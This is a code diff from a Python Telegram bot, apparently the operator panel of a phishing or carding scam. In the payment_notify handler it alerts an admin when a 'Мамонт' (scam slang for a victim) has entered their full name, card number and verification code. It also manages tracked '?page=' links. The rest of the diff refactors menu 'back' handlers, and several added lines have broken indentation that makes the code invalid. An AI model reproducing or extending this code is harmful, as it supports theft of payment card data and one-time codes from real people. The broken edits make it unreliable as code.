-        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
         import traceback
@@ -1721,7 +1688,7 @@ async def payment_notify(request):
             ]
         )
         try:
-            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
             import traceback
@@ -1737,20 +1704,20 @@ async def payment_notify(request):
             admin_user_id = row[0]
     if admin_user_id:
         try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         if code:
             try:
-                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
             except Exception as e:
                 print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
                 import traceback
@@ -2127,7 +2094,7 @@ async def event_time_api(request):
     return web.json_response({'time': ''})
 
 
-@router.message(StepFilter('pay_amount'))
+@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
 @ban_guard
 async def admin_pay_amount(message: types.Message):
     # ...існуючий код...
@@ -2153,16 +2120,15 @@ async def universal_back_handler(message: types.Message):
     user_step[uid] = None
     await message.answer("Возврат в главное меню.", reply_markup=kb)
 
-def back_from_edit_places_choose_filter(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step and step.startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад'
 
-@router.message(back_from_edit_places_choose_filter)
+
+
+# --- Хендлер для 'Назад' у edit_places_choose_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_edit_places_choose(message: types.Message):
     print("==> back_from_edit_places_choose")
-    state, _ = get_user_state(message.from_user.id)
+    state = user_step.get(message.from_user.id, '')
     page_code = state.replace('edit_places_choose_', '')
     kb = ReplyKeyboardMarkup(
         keyboard=[
@@ -2174,14 +2140,10 @@ async def back_from_edit_places_choose(message: types.Message):
         resize_keyboard=True
     )
     await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
-    set_user_state(message.chat.id, f'edit_link_menu_{page_code}')
+    user_step[message.chat.id] = f'edit_link_menu_{page_code}'
 
-def back_from_edit_link_menu_filter(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step and step.startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад'
-
-@router.message(back_from_edit_link_menu_filter)
+# --- Хендлер для 'Назад' у edit_link_menu_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_edit_link_menu(message: types.Message):
     print("==> back_from_edit_link_menu")
@@ -2193,14 +2155,10 @@ async def back_from_edit_link_menu(message: types.Message):
         resize_keyboard=True
     )
     await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
-    set_user_state(message.chat.id, 'choose_link_to_edit')
+    user_step[message.chat.id] = 'choose_link_to_edit'
 
-def back_from_choose_link_to_edit_filter(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step == 'choose_link_to_edit' and m.text and m.text.lower() == 'назад'
-
-@router.message(back_from_choose_link_to_edit_filter)
+# --- Хендлер для 'Назад' у choose_link_to_edit ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'choose_link_to_edit' and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_choose_link_to_edit(message: types.Message):
     print("==> back_from_choose_link_to_edit")
@@ -2213,24 +2171,28 @@ async def back_from_choose_link_to_edit(message: types.Message):
         resize_keyboard=True
     )
     await message.answer("Выберите действие:", reply_markup=kb)
-    set_user_state(message.chat.id, 'links_menu')
+    user_step[message.chat.id] = 'links_menu'
 
-def back_from_links_menu_filter(m):
-    uid = m.from_user.id
-    step, _ = get_user_state(uid)
-    return step == 'links_menu' and m.text and m.text.lower() == 'назад'
-
-@router.message(back_from_links_menu_filter)
+# --- Хендлер для 'Назад' у links_menu ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'links_menu' and m.text and m.text.lower() == 'назад')
 @ban_guard
 async def back_from_links_menu(message: types.Message):
     print("==> back_from_links_menu")
     kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
     await message.answer("Главное меню:", reply_markup=kb)
-    clear_user_state(message.chat.id)
+    user_step[message.chat.id] = None
 
 # --- Універсальний хендлер для 'Назад', який не спрацьовує у вкладених меню ---
 @router.message(
-    StepIsNoneFilter()
+    lambda m: (
+        m.text and m.text.lower() == 'назад'
+        and not (
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_link_menu_') or
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_places_choose_') or
+            user_step.get(m.from_user.id) == 'choose_link_to_edit' or
+            user_step.get(m.from_user.id) == 'links_menu'
+        )
+    )
 )
 @ban_guard
 async def universal_back_handler(message: types.Message):
@@ -2239,7 +2201,7 @@ async def universal_back_handler(message: types.Message):
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     user_step[uid] = None
     if message.chat.type == "private":
-        await message.answer("Возврат в главное меню.", reply_markup=kb)
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
     else:
         await message.answer("Возврат в главное меню.")
 
@@ -2257,7 +2219,7 @@ async def universal_inline_back_handler(call: types.CallbackQuery):
     if call.data == "tickets_cancel":
         await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     else:
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     
     await call.answer()
 
